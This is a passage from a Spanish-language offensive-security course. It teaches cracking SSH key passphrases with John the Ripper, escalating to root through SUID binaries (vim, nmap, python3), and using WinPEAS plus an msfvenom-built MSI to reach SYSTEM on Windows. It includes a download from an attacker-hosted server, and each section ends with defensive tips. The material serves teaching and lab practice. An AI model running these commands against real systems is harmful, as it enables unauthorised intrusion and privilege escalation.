DEK-Info: AES-128-CBC,ABCD1234ABCD1234ABCD1234ABCD1234
...
-----END OPENSSH PRIVATE KEY-----
```

(Truncado por seguridad).

---

#### 🔧 Paso 2: Convierte la clave a formato crackeable por John

John **no trabaja directamente** con el formato OpenSSH. Necesitas convertirlo.

Usa la herramienta incluida: `ssh2john.py`

```bash
python3 /usr/share/john/ssh2john.py id_rsa > hash.txt
```

🔹 Esto genera un archivo `hash.txt` con la contraseña en formato de hash que John puede usar.

---

#### 🔧 Paso 3: Usa un diccionario para intentar crackearla

Ejemplo de diccionario:

```bash
echo -e "123456\nqwerty\ncontraseña\npepito123\nmicontraseña" > pass.txt
```

Ahora corre John:

```bash
john --wordlist=pass.txt hash.txt
```

🔍 Si la contraseña está en el diccionario, John te la mostrará así:

```
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
micontraseña       (id_rsa)
```

✅ ¡Ya tienes la contraseña de la clave privada!

---

#### 🔧 Paso 4: Accede con la clave descifrada

Ahora puedes conectarte:

```bash
ssh -i id_rsa usuario@ip
```

Te pedirá la contraseña (ya la tienes gracias a John).

O si ya tienes la contraseña, puedes **quitar la protección de la clave**:

```bash
ssh-keygen -p -f id_rsa
```

Te pedirá la clave original, y luego puedes guardar la clave sin contraseña.

---

### 🛡️ ¿Cómo protegerte de esto?

| Medida                                                  | ¿Por qué ayuda?                             |
| ------------------------------------------------------- | ------------------------------------------- |
| Usa contraseñas **largas y únicas** para tus claves SSH | Evita ataques de diccionario y fuerza bruta |
| Usa **passphrases no comunes**                          | No uses “123456” ni tu cumpleaños           |
| Nunca subas `id_rsa` a GitHub o internet                | Los atacantes las buscan activamente        |
| Usa llaves **Ed25519**                                  | Más seguras que RSA                         |
| Usa `Fail2Ban` y `2FA` en tu servidor SSH               | Capa extra de seguridad                     |

---

### 📘 Resumen final

| Elemento              | Detalles                                                  |
| --------------------- | --------------------------------------------------------- |
| ¿Qué es?              | Cracking de contraseñas de llaves privadas SSH cifradas   |
| Herramienta principal | John the Ripper                                           |
| Conversión necesaria  | ssh2john.py convierte la clave a hash entendible          |
| Método de ataque      | Diccionario o fuerza bruta                                |
| Prevención            | Contraseñas seguras, claves protegidas, jamás compartidas |

---

[🔼](#índice)

---

## **993. Escalada de Privilegios con Binarios**

### 🔐 ¿Qué es la escalada de privilegios con binarios?

La **escalada de privilegios con binarios** ocurre cuando un usuario con permisos limitados (por ejemplo, un usuario normal) **aprovecha ciertos programas (binarios) mal configurados** para ejecutar comandos como **otro usuario más privilegiado**, generalmente **root**.

#### 🔸 ¿Qué tipo de binarios?

- **SUID (Set User ID):** Permiten que un archivo ejecutable se ejecute con los privilegios del propietario (a menudo root).
- **Programas comunes con funciones interactivas o shell:** como `find`, `less`, `nmap`, `vim`, `python`, etc.

---

### 🧠 ¿Por qué ocurre esta escalada?

Porque **algunos binarios permiten ejecutar comandos arbitrarios** (como abrir una shell), y si están marcados con el bit SUID, esos comandos se ejecutan con privilegios elevados.

---

### 🔧 ¿Cómo identificar binarios peligrosos?

Usamos `find` para buscar archivos con el bit SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Esto lista archivos con SUID, como por ejemplo:

```bash
/usr/bin/passwd
/usr/bin/nmap
/usr/bin/python
```

---

### 📚 Recurso clave: [GTFOBins](https://gtfobins.github.io)

Es un sitio que **muestra cómo abusar de binarios comunes** para escalar privilegios si tienen SUID.

---

### 🧰 Instalación del entorno para pruebas

Usaremos **una máquina virtual con Ubuntu o Kali Linux**.

#### ✅ Instala Ubuntu o Kali Linux (si no lo tienes)

- Descarga Kali desde: [https://kali.org/get-kali](https://kali.org/get-kali)
- O Ubuntu desde: [https://ubuntu.com/download](https://ubuntu.com/download)

---

### 🧪 DEMO: Escalada de privilegios con binarios (ejemplo real)

#### 🎯 Objetivo:

Aprovechar que el binario `vim` tiene el bit SUID activado y **abrir una shell root**.

---

#### 🔧 PASO 1: Crear un binario vulnerable con SUID

Estando como root:

```bash
cp /usr/bin/vim /tmp/vim
chmod u+s /tmp/vim
chown root:root /tmp/vim
```

Esto crea un binario de `vim` que **se ejecuta como root**.

---

#### 🔧 PASO 2: Como usuario sin privilegios, ejecutamos `vim`

```bash
/tmp/vim -c ':!sh'
```

Esto abre una shell. Ahora probamos:

```bash
whoami
```

✅ Resultado:

```
root
```

¡Acabas de escalar privilegios usando un binario vulnerable!

---

### 💡 Otro ejemplo: Escalada con `nmap`

Si `nmap` tiene SUID (esto es raro, pero puede pasar), puedes hacer:

```bash
nmap --interactive
```

Y luego dentro del intérprete de nmap:

```bash
!sh
```

Y estarás en una shell como root (si nmap tenía SUID).

---

### 🧯 ¿Cómo proteger el sistema?

| Acción recomendada                        | Descripción                                              |
| ----------------------------------------- | -------------------------------------------------------- |
| No pongas binarios innecesarios como SUID | Solo los esenciales como `/usr/bin/passwd` deben tenerlo |
| Revisa permisos regularmente              | Usa `find / -perm -4000` y audita                        |
| Usa AppArmor o SELinux                    | Para restringir lo que puede hacer un binario            |
| Usa GTFOBins para auditar tus binarios    | Así sabrás si alguno es peligroso                        |

---

### 📘 Resumen

| Punto              | Detalle                                                            |
| ------------------ | ------------------------------------------------------------------ |
| ¿Qué es?           | Usar programas mal configurados para obtener privilegios           |
| Herramientas clave | `find`, `chmod`, `GTFOBins`, binarios como `vim`, `nmap`, `python` |
| Cómo detectar      | Buscar archivos con bit SUID                                       |
| Cómo prevenir      | No asignar SUID a binarios peligrosos                              |
| Ejemplo práctico   | `vim -c ':!sh'` con SUID da shell root                             |

---

### ✅ Ejemplo final completo y funcional

#### 🔧 Preparación (como root):

```bash
cp /usr/bin/python3 /tmp/pyroot
chmod u+s /tmp/pyroot
chown root:root /tmp/pyroot
```

#### 👤 Como usuario sin privilegios:

```bash
/tmp/pyroot -c 'import os; os.system("/bin/bash")'
whoami
```

✅ Resultado:

```
root
```

---

[🔼](#índice)

---

## **994. Winpeas**

### 🧠 ¿Qué es WinPEAS?

**WinPEAS** es una herramienta de post-explotación para Windows que **automatiza la recolección de información** útil para escalar privilegios.

🔍 WinPEAS analiza:

- Permisos mal configurados en archivos y carpetas
- Servicios que puedes manipular
- Claves de registro peligrosas
- Credenciales en texto plano
- Programas con permisos de administrador mal configurados
- Tareas programadas peligrosas
- Y mucho más…

> 📌 PEAS = "Privilege Escalation Awesome Script"

---

### 🧰 ¿Cuándo y para qué usar WinPEAS?

Lo usas **después de tener acceso limitado** a una máquina Windows (por ejemplo, como un usuario estándar) y quieres ver **qué vectores de escalada de privilegios existen**.

Ideal para:

- HackTheBox / TryHackMe
- Pentesting
- CTFs
- Pruebas de seguridad internas

---

### 📥 Cómo instalar WinPEAS

#### ✅ Opción 1: Descargar desde GitHub (recomendado)

1. Abre tu navegador y ve a:

   🔗 [https://github.com/carlospolop/PEASS-ng/releases](https://github.com/carlospolop/PEASS-ng/releases)

2. Descarga el archivo `winPEASany.exe` (versión compacta y ejecutable).

3. Sube el archivo al sistema víctima:

   - Vía RDP, SMB, PowerShell, USB, Python HTTP server, etc.

---

#### ✅ Opción 2: Desde Linux (si tienes shell reversa en Windows)

En tu máquina atacante (Linux/Kali), puedes montar un servidor web:

```bash
python3 -m http.server 8000
```

Y en la máquina Windows (víctima):

```powershell
Invoke-WebRequest http://<IP-ATACANTE>:8000/winPEASany.exe -OutFile winpeas.exe
```

> Reemplaza `<IP-ATACANTE>` con la IP real de tu máquina.

---

### 🧪 Cómo usar WinPEAS

#### 🖥️ 1. Abre una terminal en la máquina Windows (cmd o PowerShell)

```cmd
winpeas.exe
```

O si descargaste con otro nombre:

```cmd
.\winpeas.exe
```

#### ⚙️ WinPEAS comenzará a escanear:

Verás líneas de salida como:

```
[+] Interesting Services - Can Start
[+] Unquoted Service Paths
[+] AlwaysInstallElevated = 1
[+] Credentials found in registry
...
```

Colores:

- 🟢 Verde: información general
- 🟡 Amarillo: posible vector
- 🔴 Rojo: alta probabilidad de escalada de privilegios

---

### 🧪 Ejemplo completo funcional

#### 🧾 Escenario

Tienes acceso limitado a una máquina Windows como el usuario `usuario1`, y subes `winpeas.exe`.

#### 🧰 Paso 1: Ejecutas WinPEAS

```cmd
winpeas.exe
```

#### 🔍 Paso 2: Identificas una vulnerabilidad

Entre los resultados, ves esto:

```
[+] AlwaysInstallElevated is ENABLED in HKLM and HKCU
```

Esto significa que puedes escalar privilegios a SYSTEM ejecutando un `.msi` malicioso.

#### 🔧 Paso 3: Creas el payload en Kali

En tu máquina Kali:

```bash
msfvenom -p windows/exec CMD=cmd.exe -f msi > elevacion.msi
```

Subes el archivo `.msi` a la víctima.

#### 🧨 Paso 4: Ejecutas el `.msi` como usuario limitado

```cmd
msiexec /quiet /qn /i elevacion.msi
```

✅ ¡Ahora se abre una terminal como SYSTEM!

---

### 🛡️ ¿Cómo protegerse?

| Acción                                                           | Descripción                                        |
| ---------------------------------------------------------------- | -------------------------------------------------- |
| Desactiva AlwaysInstallElevated                                  | En políticas de grupo o manualmente en el registro |
| Usa permisos mínimos para usuarios                               | No des permisos innecesarios                       |
| Monitorea cambios sospechosos en servicios, tareas y el registro |                                                    |
| Revisa regularmente con herramientas como WinPEAS                |                                                    |

---

### 📘 Resumen final

| Elemento          | Detalle                                                                   |
| ----------------- | ------------------------------------------------------------------------- |
| ¿Qué es?          | WinPEAS es una herramienta para enumerar vectores de escalada en Windows  |
| ¿Cómo se instala? | Descarga el `.exe` desde GitHub y súbelo a la máquina víctima             |
| ¿Cómo se usa?     | Ejecutas el `.exe` en la máquina Windows; analiza y muestra riesgos       |
| ¿Para qué sirve?  | Para descubrir formas de escalar privilegios (de user a admin/SYSTEM)     |
| ¿Ejemplo?         | Detecta `AlwaysInstallElevated`, creas `.msi` malicioso y obtienes SYSTEM |

---

[🔼](#índice)

---

| **Inicio**         | **atrás 17**                             | **Siguiente 19**                                     |
| ------------------ | ---------------------------------------- | ---------------------------------------------------- |
| [🏠](../README.md) | [⏪](./7_17_Hacking_Servicios_de_Red.md) | [⏩](./7_19_Hacking_Aplicaciones_Web_Server_Side.md) |
